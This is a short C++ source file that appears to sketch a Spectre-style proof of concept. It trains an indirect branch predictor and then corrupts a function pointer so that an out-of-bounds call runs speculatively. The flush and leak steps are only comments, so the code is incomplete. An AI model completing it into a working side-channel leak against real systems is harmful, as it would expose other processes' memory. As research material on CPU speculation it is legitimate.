#include <stdint.h>

typedef char(*functype)(int num);

uint64_t get_function_table_address() {
    return 0x1234567890abcde;
}

__attribute__((noinline))
char dummy_func(int v) {
    return 0;
}

__attribute__((noinline))
char callIndirect(functype* func) {
  return (*func)(0);
}

struct FunctionSlot {
    uint64_t func_type;
    uint64_t func_ptr;
};

__attribute__((noinline))
void train_and_leak() {
    // 1. train
    functype* val = new functype;
    *val = dummy_func;
    for (int i = 0; i < 1000000; i++) {
        callIndirect(val);
    }
    // 2. flush table length address to give some time for speculation

    // 3. Use an OOB value for indirect call table

    *((uint32_t*) val) = 0x0001000;
    char c = callIndirect(val);

    // 4. leak c

}

__attribute__((noinline))
int main(int argc, char const *argv[])
{
    train_and_leak();
    return 0;
}
